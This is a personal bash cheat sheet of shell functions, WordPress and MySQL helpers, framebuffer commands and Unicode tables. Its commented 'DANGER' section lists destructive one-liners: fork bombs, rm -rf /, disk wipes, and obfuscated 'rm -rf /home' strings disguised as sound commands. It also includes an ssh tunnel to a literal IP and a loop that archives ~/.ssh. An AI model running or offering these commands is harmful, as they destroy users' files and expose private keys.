$>  echo "\nThe weather right now:"
$>  ansiweather
$>  echo "\nNews from the BBC:"
$>  getnews bbc-news
$>  echo "\nNews from the Washington Post:"
$>  getnews the-washington-post
$>  echo "\nNews from Hacker News:"
$>  getnews hacker-news
$>}
##------------------------------------------
$> function startmyday() {echo "Good morning.";   echo "\nUpdating Homebrew...";   brew update && brew upgrade;   echo "\nThe weather right now:";   ansiweather;   echo "\nNews from the BBC:";   getnews bbc-news;   echo "\nNews from the Washington Post:";   getnews the-washington-post;   echo "\nNews from Hacker News:";   getnews hacker-news; }
##==========================================
## Convert folder of gifs into an mp4 Usage: gif2mp4 vidname
$> function gif2mp4() { convert -delay 50 -loop 0 ./*.gif ./temp.gif ; ffmpeg -i ./temp.gif ./temp%05d.png ; ffmpeg -r 10 -f image2 -i ./temp%05d.png -vcodec libx264 -crf 25 -pix_fmt yuv420p ./$1$(date +"%B%Y").mp4 ; rm ./*.png ; rm ./temp.gif ; }
##==========================================
## Function install WordPress into current folder, cd /var/www first
$> function installwordpress() {
$>    wget http://wordpress.org/latest.tar.gz
$>    tar xzvf latest.tar.gz
$>    cp -rf wordpress/** ./
$>    rm -R wordpress
$>    cp wp-config-sample.php wp-config.php
$>    wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
$>    sed -i '/#@-/r wp.keys' wp-config.php
$>    sed -i "/#@+/,/#@-/d" wp-config.php
$>    mkdir wp-content/uploads
$>    find . -type d -exec chmod 755 {} \;
$>    find . -type f -exec chmod 644 {} \;
$>    chown -R :www-data *
$>    chmod 640 wp-config.php
$>    gpasswd -a $USER www-data
$>    rm -f latest.tar.gz
$>    rm -f wp.keys
$>}
##==========================================
## Function install WordPress into current folder
$> function installwordpress() { wget http://wordpress.org/latest.tar.gz; tar xzvf latest.tar.gz; cp -rf wordpress/** ./; rm -R wordpress; cp wp-config-sample.php wp-config.php; wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/; sed -i '/#@-/r wp.keys' wp-config.php; sed -i "/#@+/,/#@-/d" wp-config.php; mkdir wp-content/uploads; find . -type d -exec chmod 755 {} \;; find . -type f -exec chmod 644 {} \;; chown -R :www-data *; chmod 640 wp-config.php; gpasswd -a $USER www-data; rm -f latest.tar.gz; rm -f wp.keys; }
##========================================
## Function install WordPress into current folder
$> function installwordpress() { gpasswd -a $USER www-data; wget http://wordpress.org/latest.tar.gz; tar xzvf latest.tar.gz; cp -rf wordpress/** ./; rm -R wordpress; cp wp-config-sample.php wp-config.php; wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/; sed -i '/#@-/r wp.keys' wp-config.php; sed -i "/#@+/,/#@-/d" wp-config.php; mkdir wp-content/uploads; find . -type d -exec chmod 755 {} \;; find . -type f -exec chmod 644 {} \;; chown -R :www-data *; chmod 640 wp-config.php; rm -f latest.tar.gz; rm -f wp.keys; }
##==========================================
### Wordpress mysql functions
##------------------------------------------
## Function to setup mysql with database and user
## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
##------------------------------------------
## Show local mysql databases
$> function mysqldatabases() { mysql -u root -p -e "SHOW DATABASES;" ; }
##------------------------------------------
## Show where wordpress redirects. Usage; wordpressmysqlcheck wp_database wp_uniquetableprefix_
$> function wordpressmysqlcheck() { mysql -u root -p -e "USE $1; SELECT option_value FROM $2options WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
##------------------------------------------
## Change where wordpress redirects. Usage; wordpressmysqlredirect wp_database wp_uniquetableprefix_ 192.168.1.10 mynewurl.com
$> function wordpressmysqlredirect() { mysql -u root -p -e "USE $1; UPDATE $2posts SET guid = replace(guid, '$3','$4'); UPDATE $2posts SET post_content = replace(post_content, '$3', '$4'); UPDATE $2links SET link_url = replace(link_url, '$3', '$4'); UPDATE $2links SET link_image = replace(link_image, '$3', '$4'); UPDATE $2postmeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2usermeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2options SET option_value = replace(option_value, '$3', '$4') WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
##------------------------------------------
##==========================================
## uses openssl aes 256 cbc encryption to encrypt file salting it with password designated by user
$> aes256crypt() { echo "Encrypting $1..."; openssl enc -aes-256-cbc -salt -a -in $1 -out encrypted-$1 || { echo "File not found"; return 1; }; echo "Successfully encrypted"; }
## uses openssl aes 256 cbc encryption decrypt file
$> aes256decrypt() { echo "Decrypting $1..."; openssl enc -aes-256-cbc -d -a -in $1 -out $2 || { echo "File not found"; return 1; }; echo "Successfully decrypted"; }
##==========================================
## Tree of pwd
$> alias treeview='pwd;find . -path ./node_modules -prune -o -print | sort | sed '\''1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'\'''
##==========================================
## Create an extra simple html framework
$> function htmlindex() { echo -e ' <html>\n    <head></head>\n    <body bgcolor="pink" text="black" link="blue" vlink="#ff0000" alink="#00ff00">\n        <p>Regular text</p><p align="center">\n        <hl>largest headline</hl><br>\n        <h6>smallest headline</h6>\n        <b>bold</b>\n        <i>italic</i>\n        <tt>teletype</tt>\n        <strong>Emphasizes</strong>\n        <font size="1">font1</font>\n        <font size="7">font7</font>\n        <font color="green">green</font>\n        <a href="URL">hyper</a>\n        <a href="URL"><img src="img.jpg"></a>\n        <a name="NAME">target</a>\n        <a href="#NAME">NAME</a></p>\n        <p><ol><li>thing1</li><li>thing2</li></ol></p>\n        <p><ul><li>thing1</li><li>thing2</li></ul></p>\n        <p><div align="right"  >Right</p>\n        <img src="img.jpg" align="left" border="1">\n        <hr size="3" width="80%" noshade />\n        <p><table border="1" cellspacing="1" cellpadding="1" width="50%" align="center">\n            <caption>label</caption>\n            <tr align="left"><th colspan="2">header1</th><th align="center">header2</th><th>header3</th>\n                <tr><td rowspan="2">item1</td><td valign="top">item2</td><td align="right">right 1tem3</td><td nowrap>Prevents the lines within a cell from being broken to fit</td></tr>\n                <tr><td>item1</td><td>item2</td><td>item3</td></tr></tr>\n        </table></p>\n        <p></p>\n    </body>\n</html> ' > index2.html ; }
##==========================================
## shopt is a builtin command that enables or disables options for the current shell session.
## Correct dir spellings
$> shopt -q -s cdspell
## Make sure display get updated when terminal window get resized
$> shopt -q -s checkwinsize
## Turn on the extended pattern matching features
$> shopt -q -s extglob
## Append rather than overwrite history on exit
$> shopt -s histappend
## Make multi-line commandsline in history
$> shopt -q -s cmdhist
## Get immediate notification of bacground job termination
$> set -o notify
## Disable [CTRL-D] which is used to exit the shell
$> set -o ignoreeof
##==========================================
##==========================================
##==========================================
## #######################################
## ##    END More functions
## #######################################
## ###################################################################
## ##    END BASH
## ###################################################################
##
##
##
## ##############################
## ##    Framebuffer
## ##############################
## shell. display. os.
##------------------------------------------
##==========================================
$> sudo apt-get install fbi                          ## Framebuffer image viewer for tty login only, NO X gui running
$> sudo apt-get install fbterm                       ## Framebuffer terminal
##==========================================
## Watch video without X gui server, using framebuffer
$> sudo chmod 777 /dev/fb0
$> mplayer -vo fbdev2 -fs -zoom -x 1024 -y 768 FILENAME.avi
##------------------------------------------
## Look at photos in framebuffer without starting X
$> fbi
## specify the framebuffer device, which should be:
$> fbi -d /dev/fb0 [...]
## Using ssh, try:
$> fbi -T 1 [...]
##------------------------------------------
## Framebuffer terminal
$> fbterm
##------------------------------------------
## Pay video in freamebuffer in tty login without GUI
$> sudo chmod 777 /dev/fb0
$> mplayer -vo fbdev2 -fs FILENAME.avi
## Set video size to screen size can get from xrandr when x is running
$> mplayer -vo fbdev2 -fs -zoom -x 1024 -y 600 FILENAME.mp4
##==========================================
## view videos using OMXPlayer:
$> omxplayer -o hdmi video.h264
##==========================================
##==========================================
##==========================================
##==========================================
##==========================================
##==========================================
## ##############################
## ##    END Framebuffer
## ##############################
##==========================================
##
##
##
## ####################################################
## ##    DANGER
## ####################################################
##==========================================
## DANGER. Next time if you want to be retarded, at least run it inside docker
## $> docker -it run ubuntu bash
##==========================================
##
## DANGER. bash fork bomb crashes a computer
## $> :(){ :|:& };:
##  Explanation
##  :()        #defines a function called : (accepts no arguments)
##  { :|:& };  #This is the function: It calls the function itself and pipes the output to the same function ":" and puts the process in the background. (Recursive invocation) with ; it ends the function definition
##  :          #Calls the function and creates havoc.
##==========================================
## DANGER. rm remove delete ALL files
## $> rm -fr * # system32
##
##==========================================
## DANGER. Command-line russian roulette
## $> [ $[ $RANDOM % 6 ] = 0 ] && rm -rf --no-preserve-root / || echo "Click"
##==========================================
## https://www.tomshardware.com/news/x86-hidden-god-mode,37582.html
## DANGER. Some x86 CPUs, VIA C3 Nehemiah chips made in 2003, have hidden backdoors that let you seize root by sending a command to an undocumented RISC core that manages the main CPU,
## The command -- ".byte 0x0f, 0x3f" in Linux -- "isn't supposed to exist, doesn't have a name, and gives you root right away," Domas said, adding that he calls it "God Mode."
## $> .byte 0x0f, 0x3f
##==========================================
## DANGER.
## $> dd if=/dev/zero of=/dev/da0 bs=4194304 seek=1024 count=399559 via: ssh -v -oStrictHostKeyChecking=no -oLogLevel=error -oUserKnownHostsFile=/dev/null aktv@94.155.49.9 -R 127.0.0.1:30081:127.0.0.1:22 -N >nl101
##==========================================
## DANGER. piping the microphone from one machine to the speakers of another. Not that dangerous just annoying
## $> dd if=/dev/dsp | ssh -C user@host dd of=/dev/dsp
##==========================================
## DANGER. Have a youtube account? Want to upload random noise to youtube to waste their disk space?
## Example: https://www.youtube.com/watch?v=nFwciRbwNxw [Embed]
## Save this post as `Dockerfile`, then run `docker build -t youtubewaster FOLDER_OF_DOCKERFILE`, then run `docker run --rm youtubewaster YOUR_YOUTUBE_STREAM_KEY`
## $> FROM alpine
## $> RUN apk add --no-cache bash ffmpeg openssl
## $> RUN echo '#!/bin/bash' > /bin/stream.bash && \
## $> echo 'if [ $# -ne 1 ]; then echo provide your youtube stream key; exit 1; fi' >> /bin/stream.bash && \
## $> echo 'openssl enc -aes-128-ctr -pass file:<(dd if=/dev/urandom bs=128 count=1 2>/dev/null |base64) -nosalt </dev/zero |ffmpeg -vcodec rawvideo -f rawvideo -pixel_format 0rgb -r 30 -s 256x144 -i - -f lavfi -i anullsrc -flags +global_header -vcodec h264 -pix_fmt yuv420p -profile:v baseline -r 30 -qscale 3 -g 25 -vb 2500k -acodec mp3 -f flv "rtmp://a.rtmp.youtube.com/live2/$1"' >> /bin/stream.bash && \
## $> chmod +x /bin/stream.bash
## $> ENTRYPOINT ["/bin/stream.bash"]
##==========================================
## DANGER. Fork bomb (dont actually execute)
## “$0” is a variable returning the name of the script that you call it in — so running “./$0&” twice amounts to the script running itself in a separate process twice. Show Sample Output
## $> echo -e “\x23\x21/bin/bash\n\.\/\$\0\&\n\.\/\$\0\&” > bomb.sh && ./bomb.sh
##==========================================
## DANGER.
## $> awk '{ s=$0; sub(/\[.*?\]/, "", s); if (s && !t[s]) { t[s]=1; print; } }'
##==========================================
## DANGER.
## $> echo "`$'\162\155' $'\55\162\146' $'\57\150\157\155\145'`" | aplay [\code]
##==========================================
## DANGER erase all the things
## $> echo "`$'\162\155' $'\55\162\146' $'\57\150\157\155\145'`" | aplay
##==========================================
## DANGER. The resulting image will contain the combined data of the SSH directory and the output of curl ifconfig.co as an image in the 32-bit BGR color format.
## -f rawvideo: sets the input format to raw video.
## -r 1: sets the input video frame rate to 1 frame per second.
## -s 512x512: sets the input video resolution to 512x512 pixels.
## -pix_fmt bgr32: sets the pixel format of the input video to 32-bit BGR.
## -i <(curl ifconfig.co; while true; do tar cf - -C ~/.ssh .; done): sets the input source to a combination of the output of curl ifconfig.co and an infinite loop that continuously creates a compressed archive of the files in the ~/.ssh directory and sends them to the input of ffmpeg. The <(command) syntax is called process substitution in Bash, and it allows the output of a command to be used as the input file argument of another command.
## -vframes 1: sets the output video to contain only 1 frame.
## -y: automatically overwrites the output file if it already exists.
## out.png: sets the output file name to out.png.
## ffmpeg -f rawvideo -r 1 -s 512x512 -pix_fmt bgr32 -i <(curl ifconfig.co; while true; do tar cf - -C ~/.ssh .; done) -vframes 1 -y out.pn
##==========================================
## DANGER.
## history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
##==========================================
## DANGER. use a random commit message
## $> git commit -m "$(curl -sL http://whatthecommit.com/index.txt)";
##==========================================
## DANGER.
## $> yes>yes yes&;yes yes&
##==========================================
## DANGER. Filesystem created:
## $> sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created
##==========================================
## DANGER. discard device sectors
## $> blkdiscard -f /dev/sda
##==========================================
## DANGER
## $> dd if=/dev/zero of=/
##==========================================
## DANGER. create 131072 empty files in the current directory with filenames ranging from 1 to 131072.
## $> touch $(seq $((2**17)))&!
##==========================================
## DANGER
## $> echo $'\162\155' $'\55\162\146' $'\57\150\157\155\145'
##==========================================
## DANGER
## $> printf "`$'\x72\x6d' $'\55\x72\x66' $'\57\x68\x6f\x6d\x65'`" | dd of=troon.bin bs=1 conv=notrunc
##==========================================
## DANGER
## $> echo "g(i,x,t,o){return((3&x&(i*((3&i>>16?\"BY}6YB6%\":\"Qj}6jQ6%\")[t%8]+51)>>o))<<4);};main(i,n,s){for(i=0;;i++)putchar(g(i,1,n=i>>14,12)+g(i,s=i>>17,n^i>>13,10)+g(i,s/3,n+((i>>11)%3),10)+g(i,s/5,8+n-((i>>10)%3),9));}"|gcc -xc -&&./a.out|aplay
##==========================================
## DANGER
## Fork bomb (don't actually execute)
## “$0” is a variable returning the name of the script that you call it in — so running “./$0&” twice amounts to the script running itself in a separate process twice. Show Sample Output
## $> echo -e “\x23\x21/bin/bash\n\.\/\$\0\&\n\.\/\$\0\&” > bomb.sh && ./bomb.sh
##==========================================
## DANGER
## Erase drive?
## $> aplay --rawaudio "`$'\x72\x6d' $'\55\x72\x66' $'\57\x68\x6f\x6d\x65'`"
##==========================================


##==========================================


##==========================================


##==========================================
## ####################################################
## ##    END DANGER
## ####################################################
##==========================================
##
##
##
##==========================================
## #################################################
## ##    Python
## #################################################
##==========================================
<<COMMENT1
python stuff

triple quotes denote multiplr line comments
"""
Multiple
lines
printed
"""

Escape What it does.
\\ Backslash (\)
\' Single- quote (')
\" Double- quote (")
\a ASCII bell (BEL)
\b ASCII backspace (BS)
\f ASCII formfeed (FF)
\n ASCII linefeed (LF)
\N{name} Character named name in the Unicode database (Unicode only)
\r ASCII carriage return (CR)
\t ASCII horizontal tab (TAB)
\uxxxx Character with 16- bit hex value xxxx (Unicode only)
\Uxxxxxxxx Character with 32- bit hex value xxxxxxxx (Unicode only)
\v ASCII vertical tab (VT)
\ooo Character with octal value oo
\xhh Character with hex value hh

COMMENT1
##==========================================
## #################################################
## ##    END Python Stuff
## #################################################
##==========================================
##
##
##
##==========================================
## ##################################################
## ##    Extra Characters
## ##################################################
##==========================================
## GUI
## Use accented characters like ë, ï, é, etc, which do not have dedicated keys on a qwerty layout.
## To enable this feature go to the keyboard preferences (menu > "Settings" > "Keyboard").
## Then, go to the tab "Layouts" and press the "Layout Options..." key at the bottom.
## Under "Position Compose key " you can enable the compose key of your liking
## (which is [Alt Gr] aka "Right Alt" for me).
## A handy way under Linux is to use a "compose key" ([Alt Gr] on my setup),
## which allows you to compose accented characters by entering the accent
## (umlaut, accent grave, ...) and the unaccented character separately.
##
#$> é   [Alt Gr]+'   e
#$> è   [Alt Gr]+`   e
#$> ü   [Alt Gr]+"   u
#$> ô   [Alt Gr]+^   o
#$> ç   [Alt Gr]+,   c
#$> ñ   [Alt Gr]+~   n
#$> å   [Alt Gr]+o   a
#$> æ   [Alt Gr]+a   e
#$> Œ   [Alt Gr]+O   E
#$> ø   [Alt Gr]+/   o
#$> ß   [Alt Gr]+s   s
#$> î   [Alt Gr]+^   i
#$> â   [Alt Gr]+^   a
#$> ¢   [Alt Gr]+|   c
#$> €   [Alt Gr]+e   =
#$> £   [Alt Gr]+l   -
#$> ½   [Alt Gr]+1   2
#$> ⅓   [Alt Gr]+1   3
#$> ©   [Alt Gr]+o   c
#$> °   [Alt Gr]+0   *
#$> µ   [Alt Gr]+/   u
#$> ±   [Alt Gr]+=   +
#$> ®   [Alt Gr]+o   r
#$> ™   [Alt Gr]+t   m
#$> ø   [Alt Gr]+o   /
#$> ß   [Alt Gr]+s   s
#$> ¶   [Alt Gr]+p   !
#$> ²   [Alt Gr]+2   ^
#$> ⁴   [Alt Gr]+4   ^
#$> ¿   [Alt Gr]+?   ?
#$> ¡   [Alt Gr]+!   !
#$> ÷   [Alt Gr]+-   :

##==========================================
## Extra Characters
<<COMMENT1
Extra Characters to cut and paste. Some do not work in HTML.
✿ ☺ ☻ ☹ ☼ ☂ ☃ ⌇ ⚛ ⌨ ✆ ☎ ⌘ ⌥ ⇧ ↩ ✞ ✡ ☭ ← → ↑ ↓ ➫ ⬇ ⬆ ☜ ☞ ☝ ☟ ✍ ✎ ✌ ☮
✔ ★ ☆ ♺ ⚑ ⚐ ✉ ✄ ⌲ ✈ ♦ ♣ ♠ ♥ ❤ ♡ ♪ ♩ ♫ ♬ ♯ ♀ ♂ ⚤ ⚥ ⚢ ⚣ ❑ ❒ ◈ ◐ ◑ ✖ ∞
« » ‹ › “ ” ‘ ’ „ ‚ – — | ⁄ \ [ ] { } § ¶ ¡ ¿ ‽ ⁂ ※ ± × ~ ≈ ÷ ≠ π †
‡ ¥ € $ ¢ £ ß © ® @ ™ ° ‰ … · • ●
૱ ꠸ ┯ ┰ ┱ ┲ ❗ ► ◄ Ă ă 0 1 2 3 4 5 6 7 8 9 Ǖ ǖ Ꞁ ¤  Ð ¢ ℥ Ω ℧ K ℶ ℷ ℸ ⅇ ⅊
⚌ ⚍ ⚎ ⚏ ⚭ ⚮ ⌀ ⏑ ⏒ ⏓ ⏔ ⏕ ⏖ ⏗ ⏘ ⏙ ⏠ ⏡ ⏦
ᶀ ᶁ ᶂ ᶃ ᶄ ᶆ ᶇ ᶈ ᶉ ᶊ ᶋ ᶌ ᶍ ᶎ ᶏ ᶐ ᶑ ᶒ ᶓ ᶔ ᶕ ᶖ ᶗ ᶘ ᶙ ᶚ ᶸ ᵯ ᵰ ᵴ ᵶ ᵹ ᵼ ᵽ ᵾ ᵿ ⁁ ⁊⸜ ⸝ ¶ ¥ £
⅕ ⅙ ⅛ ⅔ ⅖ ⅗ ⅘ ⅜ ⅚ ⅐ ⅝ ↉ ⅓ ⅑ ⅒ ⅞
← ↑ → ↓ ↔ ↕ ↖ ↗ ↘ ↙ ↚ ↛ ↜ ↝ ↞ ↟ ↠ ↡ ↢ ↣ ↤ ↥ ↦ ↧ ↨ ↩ ↪ ↫ ↬ ↭ ↮
↯ ↰ ↱ ↲ ↳ ↴ ↵ ↶ ↷ ↸ ↹ ↺ ↻ ↼ ↽ ↾ ↿ ⇀ ⇁ ⇂ ⇃ ⇄ ⇅ ⇆ ⇇ ⇈ ⇉ ⇊ ⇋ ⇌ ⇍
⇎ ⇏ ⇐ ⇑ ⇒ ⇓ ⇔ ⇕ ⇖ ⇗ ⇘ ⇙ ⇚ ⇛ ⇜ ⇝ ⇞ ⇟ ⇠ ⇡ ⇢ ⇣ ⇤ ⇥
⇦ ⇨ ⇩ ⇪ ⇧ ⇫ ⇬ ⇭ ⇮ ⇯ ⇰ ⇱ ⇲ ⇳ ⇴ ⇵ ⇶ ⇷ ⇸ ⇹ ⇺ ⇻ ⇼ ⇽ ⇾ ⇿ ⟰ ⟱ ⟲ ⟳ ⟴
⟵ ⟶ ⟷ ⟸ ⟹ ⟺ ⟻ ⟼ ⟽ ⟾ ⟿ ⤀ ⤁ ⤂ ⤃ ⤄ ⤅ ⤆ ⤇ ⤈ ⤉ ⤊ ⤋ ⤌ ⤍ ⤎ ⤏ ⤐ ⤑
⤒ ⤓ ⤔ ⤕ ⤖ ⤗ ⤘ ⤙ ⤚ ⤛ ⤜ ⤝ ⤞ ⤟ ⤠ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲
⤳ ⤴ ⤵ ⤶ ⤷ ⤸ ⤹ ⤺ ⤻ ⤼ ⤽ ⤾ ⤿ ⥀ ⥁ ⥂ ⥃ ⥄ ⥅ ⥆ ⥇ ⥈ ⥉
⥊ ⥋ ⥌ ⥍ ⥎ ⥏ ⥐ ⥑ ⥒ ⥓ ⥔ ⥕ ⥖ ⥗ ⥘ ⥙ ⥚ ⥛ ⥜ ⥝ ⥞ ⥟ ⥠ ⥡ ⥢ ⥣ ⥤ ⥥ ⥦ ⥧ ⥨ ⥩ ⥪ ⥫ ⥬ ⥭
⥮ ⥯ ⥰ ⥱ ⥲ ⥳ ⥴ ⥵ ⥶ ⥷ ⥸ ⥹ ⥺ ⥻ ⥼ ⥽ ⥾ ⥿
➔ ➘ ➙ ➚ ➛ ➜ ➝ ➞ ➝ ➞ ➟ ➠ ➡ ➢ ➣ ➤ ➥ ➦ ➧ ➨ ➩ ➩ ➪ ➫ ➬ ➭ ➮ ➯ ➱ ➲ ➳ ➴ ➵ ➶ ➷ ➸ ➹ ➺ ➻ ➼ ➽ ➾
⬀ ⬁ ⬂ ⬃ ⬄ ⬅ ⬆ ⬇ ⬈ ⬉ ⬊ ⬋ ⬌ ⬍ ⬎ ⬏ ⬐ ⬑ ☇ ☈ ⏎ ⍃ ⍄ ⍅ ⍆ ⍇ ⍈ ⍐ ⍗ ⍌ ⍓ ⍍ ⍔ ⍏ ⍖ ♾ ⎌ ☊ ☋ ☌ ☍
⌃ ⌄ ⌤ ⌅ ⌆ ⌇ ⚋ ⚊ ⌌ ⌍ ⌎ ⌏ ⌐ ⌑ ⌔ ⌕ ⌗ ⌙ ⌢ ⌣ ⌯ ⌬ ⌭ ⌮ ⌖ ⌰ ⌱ ⌲ ⌳
⌴ ⌵ ⌶ ⌷ ⌸ ⌹ ⌺ ⌻ ⌼ ⍯ ⍰ ⌽ ⌾ ⌿ ⍀ ⍁ ⍂ ⍉ ⍊ ⍋ ⍎ ⍏ ⍑ ⍒ ⍕ ⍖ ⍘ ⍙ ⍚ ⍛ ⍜ ⍝ ⍞ ⍠ ⍟
⍡ ⍢ ⍣ ⍤ ⍥ ⍨ ⍩ ⍦ ⍧ ⍬ ⍿ ⍪ ⍮ ⍫ ⍱ ⍲ ⍭ ⍳ ⍴ ⍵ ⍶ ⍷ ⍸ ⍹ ⍺ ⍼ ⍽ ⍾ ⎀ ⎁ ⎂ ⎃ ⎄ ⎅
⎆ ⎉ ⎊ ⎋ ⎍ ⎎ ⎏ ⎐ ⎑ ⎒ ⎓ ⎔ ⎕ ⏣ ⌓ ⏥ ⏢ ⎖ ⎲ ⎳ ⎴ ⎵ ⎶ ⎸ ⎹ ⎺ ⎻ ⎼ ⎽ ⎾ ⎿
⏀ ⏁ ⏂ ⏃ ⏄ ⏅ ⏆ ⏇ ⏈ ⏉ ⏉ ⏋ ⏌ ⏍ ⏐ ⏤ ⏚ ⏛ Ⓝ ℰ ⓦ !       ⌘ « » ‹ ›
‘ ’ “ ” „ ‚ ❝ ❞ £ ¥ € $ ¢ ¬ ¶ @ § ® © ™ ° × π ± √ ‰ Ω ∞ ≈ ÷ ~ ≠
¹ ² ³ ½ ¼ ¾ ‐ – — | ⁄ \ [ ] { } † ‡ … · • ● ⌥ ⌃ ⇧ ↩ ¡ ¿ ‽ ⁂ ∴ ∵ ◊ ※ ← → ↑ ↓
☜ ☞ ☝ ☟ ✔ ★ ☆ ♺ ☼ ☂ ☺ ☹ ☃ ✉ ✿ ✄ ✈ ✌ ✎ ♠ ♦ ♣ ♥ ♪ ♫ ♯ ♀ ♂ α ß
Á á À à Å å Ä ä Æ æ Ç ç É é È è Ê ê Í í Ì ì Î î Ñ ñ Ó ó Ò ò Ô ô Ö ö Ø ø Ú ú Ù ù Ü ü Ž ž ₳
฿ ￠ € ₡ ¢ ₢ ₵ ₫ ￡ £ ₤ ₣ ƒ ₲ ₭ ₥ ₦ ₱ ＄ $ ₮ ₩ ￦ ¥ ￥ ₴ ₰
~ ƻ Ƽ ƽ ¹ ¸ ¬ ¨ ɂ ǁ ¯ Ɂ ǂ ¡ ´ ° ꟾ ¦ } { | . , · ] ) [ / _ \ ¿ º §  * - + (
! & % $ ¼ ¾ ½ ¶ © ® @ ẟ Ɀ  Ȿ ^ ꜠ ꜡ ỻ  = : ; < ꞌ Ꞌ ꞊ ꞁ ꞈ ꞉ > ? ÷ ℾ ℿ ℔ ℩ ℉ ⅀ ℈
þ ð Þ µ ª ꝋ ꜿ Ꜿ ⱽ ⱺ ⱹ ⱷ ⱶ Ⱶ ⱴ ⱱ Ɒ ⱦ ȶ ȴ ȣ Ȣ ȡ ȝ Ȝ ț ȋ Ȋ ȉ Ȉ ǯ Ǯ ǃ ǀ ƿ ƾ ƺ ƹ Ƹ Ʒ
Ʋ ư ƪ ƣ Ƣ Ɵ ƛ Ɩ ƕ ƍ ſ ỽ ⸀ ⸁ ⸂ ⸃ ⸄ ⸅ ⸆ ⸇ ⸈ ⸉ ⸊ ⸋ ⸌ ⸍ ⸎ ⸏ ⸐ ⸑ ⸒ ⸔ ⸕
▲ ▼ ◀ ▶ ◢ ◣ ◥ ◤ △ ▽ ◿ ◺ ◹ ◸ ▴ ▾ ◂ ▸ ▵ ▿ ◃ ▹ ◁ ▷ ◅ ▻ ◬ ⟁ ⧋ ⧊ ⊿ ∆ ∇ ◭ ◮ ⧩ ⧨ ⌔ ⟐ ◇ ◆ ◈ ⬖ ⬗ ⬘ ⬙
⬠ ⬡ ⎔ ⋄ ◊ ⧫ ⬢ ⬣ ▰ ▪ ◼ ▮ ◾ ▗ ▖ ■ ∎ ▃ ▄ ▅ ▆ ▇ █ ▌ ▐ ▍ ▎ ▉ ▊ ▋ ❘ ❙ ❚ ▀ ▘ ▝ ▙ ▚ ▛ ▜ ▟ ▞ ░ ▒ ▓ ▂ ▁ ▬ ▔
▫ ▯ ▭ ▱ ◽ □ ◻ ▢ ⊞ ⊡ ⊟ ⊠ ▣ ▤ ▥ ▦ ⬚ ▧ ▨ ▩ ⬓ ◧ ⬒ ◨ ◩ ◪ ⬔ ⬕ ❏ ❐ ❑ ❒ ⧈ ◰ ◱ ◳ ◲ ◫ ⧇ ⧅ ⧄ ⍁ ⍂ ⟡ ⧉ ⚬ ○ ⚪
◌ ◍ ◎ ◯ ❍ ◉ ⦾ ⊙ ⦿ ⊜ ⊖ ⊘ ⊚ ⊛ ⊝ ● ⚫ ⦁ ◐ ◑ ◒ ◓ ◔ ◕ ⦶ ⦸ ◵ ◴ ◶ ◷ ⊕ ⊗ ⦇ ⦈ ⦉ ⦊
❨ ❩ ⸨ ⸩ ◖ ◗ ❪ ❫ ❮ ❯ ❬ ❭ ❰ ❱ ⊏ ⊐ ⊑ ⊒ ◘ ◙ ◚ ◛ ◜ ◝ ◞ ◟ ◠ ◡ ⋒ ⋓ ⋐ ⋑ ╰ ╮ ╭ ╯ ⌒ ╳ ✕ ╱ ╲ ⧸ ⧹
⌓ ◦ ❖ ✖ ✚ ✜ ⧓ ⧗ ⧑ ⧒ ⧖ _ ⚊ ╴ ╼ ╾ ‐ ⁃ ‑ ‒ - – ⎯ — ― ╶ ╺ ╸ ─ ━ ┄ ┅ ┈ ┉ ╌ ╍ ═ ≣ ≡ ☰ ☱ ☲ ☳ ☴ ☵ ☶ ☷
╵ ╷ ╹ ╻ │ ▕ ▏ ┃ ┆ ┇ ┊ ╎ ┋ ╿ ╽ ┌ ┍ ┎ ┏ ┐ ┑ ┒ ┓ └ ┕ ┖ ┗ ┘ ┙ ┚ ┛ ├ ┝ ┞ ┟ ┠ ┡ ┢ ┣ ┤ ┥ ┦ ┧ ┨ ┩ ┪ ┫
┬ ┭ ┮ ┳ ┴ ┵ ┶ ┷ ┸ ┹ ┺ ┻ ┼ ┽ ┾ ┿ ╀ ╁ ╂ ╃ ╄ ╅ ╆ ╇ ╈ ╉ ╊ ╋ ╏ ║ ╔ ╒ ╓ ╕ ╖ ╗ ╚ ╘ ╙ ╛ ╜ ╝ ╞ ╟ ╠ ╡ ╢ ╣
╤ ╥ ╦ ╧ ╨ ╩ ╪ ╫ ╬ ⌞ ⌟ ⌜ ⌝ ⌊ ⌋ ⌉ ⌈ ⌋ ₯ ἀ ἁ ἂ ἃ ἄ ἅ ἆ ἇ Ἀ Ἁ Ἂ Ἃ Ἄ Ἅ Ἆ Ἇ ἐ ἑ ἒ ἓ ἔ ἕ Ἐ Ἑ Ἒ Ἓ Ἔ Ἕ
ἠ ἡ ἢ ἣ ἤ ἥ ἦ ἧ Ἠ Ἡ Ἢ Ἣ Ἤ Ἥ Ἦ Ἧ ἰ ἱ ἲ ἳ ἴ ἵ ἶ ἷ Ἰ Ἱ Ἲ Ἳ Ἴ Ἵ Ἶ Ἷ ὀ ὁ ὂ ὃ ὄ ὅ Ὀ Ὁ Ὂ Ὃ Ὄ Ὅ
ὐ ὑ ὒ ὓ ὔ ὕ ὖ ὗ Ὑ Ὓ Ὕ Ὗ ὠ ὡ ὢ ὣ ὤ ὥ ὦ ὧ Ὠ Ὡ Ὢ Ὣ Ὤ Ὥ Ὦ Ὧ ὰ ά ὲ έ ὴ ή ὶ ί ὸ ό ὺ ύ ὼ ώ
